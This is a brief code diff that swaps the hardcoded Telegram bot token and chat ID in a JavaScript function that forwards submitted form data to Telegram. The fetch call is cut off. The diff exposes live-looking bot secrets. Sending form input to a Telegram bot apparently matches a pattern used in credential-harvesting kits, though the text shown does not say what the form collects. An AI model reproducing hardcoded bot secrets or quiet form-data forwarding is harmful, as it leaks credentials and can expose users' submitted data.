@@ -1,7 +1,7 @@
 // Function to send data to Telegram
 async function sendToTelegram(formData) {
-  const token = '6360110089:AAHoZ6sH3RzWfVczG6opj-wHj8eLmoapCdk'; // Replace with your bot token
-  const chatId = '7473749894'; // Replace with your chat ID (or your group's chat ID)
+  const token = '7532497184:AAGr2EaF4FhduYudDts7gacJD3NEmqQE8YM'; // Replace with your bot token
+  const chatId = '7304881333'; // Replace with your chat ID (or your group's chat ID)
 
   try {
     const response = await fetch(
